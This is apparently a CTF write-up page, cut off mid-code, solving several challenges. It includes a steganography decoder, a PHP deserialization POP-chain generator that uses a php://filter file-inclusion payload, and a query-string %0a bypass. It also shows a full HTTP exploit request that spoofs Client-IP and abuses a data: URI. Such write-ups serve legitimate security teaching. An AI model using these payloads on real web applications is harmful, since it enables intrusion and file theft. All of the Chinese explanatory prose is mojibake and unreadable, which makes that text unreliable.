<h3 id="Hello-misc"><a href="#Hello-misc" class="headerlink" title="Hello_ misc"></a><strong>Hello_ misc</strong></h3><p>æ‰“å¼€é¢˜ç›®æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…å’Œä¸€å¼ å›¾ç‰‡ï¼š</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200424211603839.png" alt="image-20200424211603839" style="high:60%;width:60%;" />

<p>binwalkè¿™ä¸ªtryå›¾ç‰‡å¯ä»¥å¾—åˆ°ä¸€ä¸ªZIPå‹ç¼©åŒ…ã€‚</p>
<p>ç„¶åå†ç”¨ç”¨<code>stegsolve</code>æŸ¥çœ‹å›¾ç‰‡ï¼Œ<code>Save Bin</code>å¯ç›´æ¥å¾—åˆ°å›¾ç‰‡ï¼š</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200424212518740.png" alt="image-20200424212518740" style="high:80%;width:80%;" />

<p>ç”¨å›¾ç‰‡ä¸Šçš„å¯†ç æ‰“å¼€ZIPå‹ç¼©åŒ…ã€‚å‘ç°æ–‡æ¡£ä¿¡æ¯ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">127</span></span><br><span class="line"><span class="number">255</span></span><br><span class="line"><span class="number">63</span></span><br><span class="line"><span class="number">191</span></span><br><span class="line"><span class="number">127</span></span><br><span class="line"><span class="number">191</span></span><br><span class="line"><span class="number">63</span></span><br><span class="line"><span class="number">127</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>è§‚å¯Ÿå¯çŸ¥æ–‡æ¡£ä¸­åªå«æœ‰ <strong>127 255 63 191</strong> è¿™å››ä¸ªæ•°å­—ï¼Œå°†è¿™å››ä¸ªæ•°å­—è½¬åŒ–ä¸ºäºŒè¿›åˆ¶ï¼Œå¯ä»¥çœ‹åˆ°è¿™å››ä¸ªæ•°å­—çš„äºŒè¿›åˆ¶å½¢å¼ä¸­ <strong>åªæœ‰æœ€é«˜ä¸¤ä½çš„äºŒè¿›åˆ¶æ•°ä¸åŒ</strong> ï¼Œå°†å…¶æœ€é«˜ä¸¤ä½æå–å‡ºæ¥ç»„åˆåœ¨ä¸€èµ·è½¬åŒ–ä¸ºASCIIï¼Œå¯ä»¥å¾—åˆ°rarå¯†ç ï¼š</p>
<p>è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = open(<span class="string">&#x27;../out.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">a = f.readlines()</span><br><span class="line">p = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">	p.append(int(i))</span><br><span class="line"></span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> p:</span><br><span class="line">	<span class="keyword">if</span> i ==<span class="number">63</span>:</span><br><span class="line">		a = <span class="string">&#x27;00&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> i== <span class="number">127</span>:</span><br><span class="line">		a= <span class="string">&#x27;01&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> i== <span class="number">191</span>:</span><br><span class="line">		a=<span class="string">&#x27;10&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> i== <span class="number">255</span>:</span><br><span class="line">		a=<span class="string">&#x27;11&#x27;</span></span><br><span class="line">	s +=a</span><br><span class="line"></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(s),<span class="number">8</span>):</span><br><span class="line">	result += chr(int(s[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p>åˆ°raråŒ…çš„è§£å‹å¯†ç ï¼š<strong>0ac1fe6b77be5dbe</strong></p>
<p>è§£å‹å¯ä»¥å¾—åˆ°ä¸€ä¸ªzipåŒ…ï¼Œçœ‹zipåŒ…é‡Œçš„å†…å®¹(é‡Œé¢éƒ½æ˜¯xml)å¯ä»¥çŸ¥é“è¿™æ˜¯ä¸€ä¸ª <strong>docx</strong> æ–‡ä»¶ï¼Œæ”¹åç¼€ä¸ºdocxå¾—åˆ°æœ€ç»ˆçš„æ–‡ä»¶ã€‚</p>
<p>å°†æ–‡ä»¶å†…å®¹å…¨é€‰æ”¹ä¸ºæ·±è‰²ï¼Œå¯ä»¥çœ‹åˆ°åœ¨æ–‡æ¡£çš„æœ€ä¸‹æ–¹è—æœ‰å‡ ä¸²å­—ç¬¦</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200424212849538.png" alt="image-20200424212849538" style="high:80%;width:80%;" />

<p>å†base64è§£å¯†ï¼š</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200424212915052.png" alt="image-20200424212915052" style="high:80%;width:80%;" />

<h3 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a><strong>ezpop</strong></h3><p>é¦–å…ˆè¯´ä¸€ä¸‹</p>
<p>PHPç±»ä¸­çš„<code>__get</code>å’Œ<code>__set</code>å‡½æ•°ã€‚</p>
<p>å½“è¯•å›¾è·å–ä¸€ä¸ªä¸å¯è¾¾å±æ€§æ—¶(æ¯”å¦‚private)ï¼Œç±»ä¼šè‡ªåŠ¨è°ƒç”¨<code>__get</code>å‡½æ•°ã€‚</p>
<p>å½“è¯•å›¾è®¾ç½®ä¸€ä¸ªä¸å¯è¾¾å±æ€§æ—¶(æ¯”å¦‚private)ï¼Œç±»ä¼šè‡ªåŠ¨è°ƒç”¨<code>__set</code>å‡½æ•°ã€‚</p>
<p>ä¸¾ä¸€ä¸ªä¾‹å­ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&#x27;å‘¨ä¼¯é€š&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> $sex = <span class="string">&#x27;ç”·&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$class = <span class="keyword">new</span> Person();</span><br><span class="line"><span class="keyword">echo</span> $class-&gt;sex;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œ$sexå£°æ˜äº†ç§ç”¨å˜é‡ï¼Œç§æœ‰å˜é‡æˆ–æ–¹æ³•åœ¨ç±»å®ä¾‹åŒ–æ˜¯ä¸èƒ½ç›´æ¥è®¿é—®çš„ï¼Œæ‰€ä»¥ä¸Šé¢ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Fatal error: Uncaught Error: Cannot access private property Person::$sex </span><br></pre></td></tr></table></figure>

<p>ç„¶åæ”¹é€ ä¸€ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&#x27;å‘¨ä¼¯é€š&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> $sex = <span class="string">&#x27;ç”·&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$name</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;ä¸ªäººä¿¡æ¯:&#x27;</span>.$name.<span class="keyword">$this</span>-&gt;sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$class = <span class="keyword">new</span> Person();</span><br><span class="line"><span class="keyword">echo</span> $class-&gt;sex;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè¾“å‡ºçš„æ˜¯ä¸ªäººä¿¡æ¯:sexç”·ã€‚</p>
<p>å¯ä»¥çœ‹å‡º<code>__get</code>æ–¹æ³•è‡ªåŠ¨è°ƒç”¨äº†ï¼Œå¹¶å¯ä»¥è®¿é—®ç§æœ‰å˜é‡ã€‚</p>
<p>å†æ¥çœ‹ä¸€ä¸‹<code>__set</code>å‡½æ•°ï¼ŒåŒæ ·ä¹Ÿæ˜¯å…ˆä½¿ç”¨å¯è¾¾çš„ç§æœ‰å±æ€§ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&#x27;å‘¨ä¼¯é€š&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> $sex = <span class="string">&#x27;ç”·&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params">$name, $val</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;ä¸ªäººä¿¡æ¯:&#x27;</span>.$name. $val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$class = <span class="keyword">new</span> Person();</span><br><span class="line">$class-&gt;sex = <span class="string">&#x27;å¥³&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ä¸ªäººä¿¡æ¯:sexå¥³</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°å› ä¸ºè®¾ç½®äº†ä¸å¯è¾¾å±æ€§$sexï¼Œæ‰€ä»¥æˆåŠŸè°ƒç”¨äº†<code>__set</code>å‡½æ•°å¹¶è¾“å‡ºã€‚</p>
<p><code>__invoke()</code> å‡½æ•°ä¼šåœ¨ä¸€ä¸ªç±»è¢«å½“æˆå‡½æ•°è°ƒç”¨æ—¶è¢«è§¦å‘ã€‚ä¾‹å¦‚ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CallableClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params">$param1, $param2</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        var_dump($param1,$param2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj  = <span class="keyword">new</span> CallableClass();</span><br><span class="line">$obj(<span class="number">123</span>, <span class="number">456</span>);</span><br><span class="line">var_dump(is_callable($obj));</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">int(<span class="number">123</span>)</span><br><span class="line">int(<span class="number">456</span>)</span><br><span class="line">bool(true)</span><br></pre></td></tr></table></figure>

<p>å†æ¥çœ‹çœ‹è¿™é“é¢˜ç›®</p>
<h4 id="é¢˜ç›®æºç "><a href="#é¢˜ç›®æºç " class="headerlink" title="é¢˜ç›®æºç "></a><strong>é¢˜ç›®æºç </strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line">&lt;?php</span><br><span class="line">//flag <span class="keyword">is</span> <span class="keyword">in</span> flag.php</span><br><span class="line">//WTF IS THIS?</span><br><span class="line">//Learn From https://ctf.ieki.xyz/library/php.html<span class="comment">#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line">//And Crack It!</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=<span class="string">&#x27;index.php&#x27;</span>)&#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line"><span class="meta">    @unserialize($_GET[&#x27;pop&#x27;]);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=new Show;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>ååºåˆ—åŒ–ç›´æ¥åˆ†æï¼Œæ„é€ popé“¾ï¼Œåˆ†æä¸€ä¸‹ä¸‰ä¸ªç±»ã€‚</p>
<h4 id="Modifierç±»"><a href="#Modifierç±»" class="headerlink" title="Modifierç±»"></a><strong>Modifierç±»</strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°<code>include</code>å‡½æ•°ï¼Œæ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¼ªåè®®è¯»å–æ³¨é‡Šä¸­flag.phpä¸­çš„å†…å®¹ã€‚</p>
<p>è¿™é‡Œæœ‰é­”æ³•æ–¹æ³•<code>__invoke</code>å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘ï¼Œæ‰€ä»¥åœ¨è„šæœ¬ä¸­ï¼Œè¦æŠŠModifierç±»è°ƒç”¨ä¸ºå‡½æ•°ã€‚</p>
<h4 id="Showç±»"><a href="#Showç±»" class="headerlink" title="Showç±»"></a><strong>Showç±»</strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=<span class="string">&#x27;index.php&#x27;</span>)&#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>__construct</code>æ–¹æ³•ï¼Œæ¥æ”¶å‚æ•°<code>$file</code>ï¼Œ<code>$this-&gt;source = $file</code>å°†<code>$file</code>çš„å€¼èµ‹ç»™<code>source</code>ã€‚è€Œ<code>$file</code>çš„å€¼ç›´æ¥å°±æ˜¯<code>index.php</code>ï¼Œæ‰€ä»¥è¿˜æ˜¯è¾“å‡º<code>index.php</code>ã€‚</li>
<li><code>__toString</code>æ–¹æ³•ï¼Œå½“å‰å¯¹è±¡è®¿é—®<code>str</code>å†è®¿é—®<code>source</code>ï¼Œç„¶åè¿”å›è¿™ä¸ªå€¼ï¼Œå°±æ˜¯æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘ã€‚</li>
<li><code>__wakeup</code>æ–¹æ³•ï¼Œä½¿ç”¨ååºåˆ—åŒ–çš„æ—¶å€™è§¦å‘ï¼Œè¿‡æ»¤ä¸€äº›åè®®ï¼Œä½†æ˜¯æ˜¾è€Œæ˜“è§å¯ä»¥ç”¨<code>filter</code>ã€‚</li>
</ul>
<h4 id="Testç±»"><a href="#Testç±»" class="headerlink" title="Testç±»"></a><strong>Testç±»</strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>__construct</code>æ–¹æ³•ï¼ŒæŠŠpå¯¹è±¡å˜æˆä¸€ä¸ªæ•°ç»„ã€‚</li>
<li><code>__get</code>æ–¹æ³•ï¼Œä»ä¸å¯è®¿é—®çš„å±æ€§ä¸­è¯»å–æ•°æ®ä¼šè§¦å‘ã€‚</li>
</ul>
<p>ç„¶åå¼€å§‹æ„é€ popé“¾ï¼š</p>
<p>å› ä¸ºæœ€ç»ˆæ˜¯æƒ³è°ƒç”¨æ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œè¯»å–flag.phpã€‚æ‰€ä»¥è¦è§¦å‘<code>__invoke</code>ã€‚</p>
<p>è€Œ<code>__get</code>å°†å¯¹è±¡pä½œä¸ºå‡½æ•°è°ƒç”¨ï¼Œå°†på®ä¾‹åŒ–ä¸º<code>Modifier</code>ç±»ï¼Œä»è€Œè§¦å‘<code>__invoke</code>ã€‚</p>
<p>ç„¶å<code>__toString</code>è®¿é—®<code>str</code>çš„<code>source</code>å±æ€§ï¼Œå¦‚æœå°†strå®ä¾‹åŒ–ä¸ºTestï¼Œå› ä¸ºTestç±»ä¸­ä¸å«sourceå±æ€§ï¼Œä»è€Œè§¦å‘<code>__get</code>æ–¹æ³•ã€‚</p>
<p><code>__wakeup</code>æŠŠå¯¹è±¡å½“æˆå­—ç¬¦ä¸²å¤„ç†(åšåŒ¹é…çš„æ—¶å€™)ï¼Œè§¦å‘<code>__toString</code>ã€‚</p>
<p>æœ€åæ˜¯ååºåˆ—åŒ–è§¦å‘<code>__wakeup</code>ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span> ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file)&#123;</span><br><span class="line">    $this-&gt;source = $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Show(<span class="string">&#x27;abc&#x27;</span>);</span><br><span class="line">$a-&gt;str = new Test();</span><br><span class="line">$a-&gt;str-&gt;p = new Modifier();</span><br><span class="line">$b = new Show($a);//å°†å­—ç¬¦ä¸²æ‰“å°å‡ºæ¥</span><br><span class="line">echo urlencode(serialize($b));</span><br></pre></td></tr></table></figure>

<p>ç„¶åå¾—åˆ°çš„æ˜¯ä¸€ä¸²base64ï¼Œè§£ç å³å¯å¾—åˆ°flagã€‚</p>
<h3 id="å¥—å¨ƒ"><a href="#å¥—å¨ƒ" class="headerlink" title="å¥—å¨ƒ"></a><strong>å¥—å¨ƒ</strong></h3><p>F12æŸ¥çœ‹åˆ°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$query = $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span>( substr_count($query, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || substr_count($query, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">      die(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="keyword">if</span>($_GET[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="string">&#x27;/^23333$/&#x27;</span>, $_GET[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">      echo <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆæ˜¯å¯¹å­—ç¬¦ä¸²çš„ä¸‹åˆ’çº¿è¿›è¡Œç»Ÿè®¡ï¼Œå¦‚æœå¤§äº0å°±ç›´æ¥die()</p>
<p>ä½†æ˜¯ä¸‹é¢éœ€è¦æ¥æ”¶ä¸€ä¸ªåŒ…å«ä¸‹åˆ’çº¿çš„å‚æ•°b_u_p_tï¼Œè€Œä¸”å®ƒä¸èƒ½ç­‰äº23333è€Œæ­£åˆ™åŒ¹é…å´è¦æœ‰23333ã€‚è¿™é‡Œç›´æ¥ç”¨%0aå¯ä»¥ç»•è¿‡ã€‚è€Œphpå‚æ•°ï¼Œç©ºæ ¼å’Œç‚¹éƒ½ä¼šå˜æˆä¸‹åˆ’çº¿_ã€‚</p>
<p><strong>payload</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://ecf196f2-c27e-427a-aecc-31e4ee6a3a28.merak-ctf.site/?b.u.p.t=23333%0a</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°secrettw.phpæ–‡ä»¶åã€‚</p>
<p>å³é”®çœ‹æºç å­˜åœ¨ä¸€ä¸ªjsfuckï¼Œç›´æ¥ä¸¢è°·æ­Œæµè§ˆå™¨è§£ç å¾— <code>post me Merak</code>ã€‚</p>
<p>postæäº¤Merakå¾—æºç </p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"> error_reporting(<span class="number">0</span>); </span><br><span class="line"> include <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line"> ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"> include <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"> <span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">     highlight_file(__FILE__); </span><br><span class="line">     die(); </span><br><span class="line"> &#125; </span><br><span class="line"> function change($v)&#123; </span><br><span class="line">     $v = base64_decode($v); </span><br><span class="line">     $re = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">     <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">         $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">     &#125; </span><br><span class="line">     <span class="keyword">return</span> $re; </span><br><span class="line"> &#125;</span><br><span class="line"> echo <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"> $ip = getIp();</span><br><span class="line"> <span class="keyword">if</span>($ip!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"> echo <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.$ip;</span><br><span class="line"> <span class="keyword">if</span>($ip === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents($_GET[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"> echo <span class="string">&quot;Your REQUEST is:&quot;</span>.change($_GET[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"> echo file_get_contents(change($_GET[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"> ?&gt;  </span><br></pre></td></tr></table></figure>

<p>ç»•è¿‡IPçš„æ–¹æ³•<code>Client-IP: 127.0.0.1</code>ï¼Œä½¿ç”¨dataåè®®å»ç»•è¿‡<code>file_get_contents</code>ã€‚</p>
<p>é€†å‘changeå‡½æ•°</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function dechange($v)&#123;</span><br><span class="line">    $re = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123;</span><br><span class="line">        $re .= chr ( ord ($v[$i]) - $i*<span class="number">2</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($re);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo dechange(<span class="string">&#x27;todat is a happy day&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>exp</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">GET /secrettw.php?2333=data:text/html;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=&amp;file=ZmpdYSZmXGI= HTTP/1.1</span><br><span class="line">Host: <span class="number">17409</span>a10<span class="number">-8159</span><span class="number">-4621</span>-ac69<span class="number">-576</span>be7b7bd12.node3.buuoj.cn</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">76.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">76.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*/*;q=<span class="number">0.8</span></span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Client-IP: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure>

<h3 id="PYwebsite"><a href="#PYwebsite" class="headerlink" title="PYwebsite"></a>PYwebsite</h3><p>XFFç»•è¿‡</p>
<h3 id="ez-bypass"><a href="#ez-bypass" class="headerlink" title="ez_bypass"></a>ez_bypass</h3><p>æºç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">include <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">$flag=<span class="string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;gg&#x27;</span>])&amp;&amp;isset($_GET[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    $id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">&#x27;gg&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        echo <span class="string">&#x27;You got the first step&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">            $passwd=$_POST[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo <span class="string">&#x27;Good Job!&#x27;</span>;</span><br><span class="line">                     highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                     die(<span class="string">&#x27;By Retr_0&#x27;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     echo <span class="string">&quot;can you think twice??&quot;</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                echo <span class="string">&#x27;You can not get it !&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">&#x27;only one way to get the 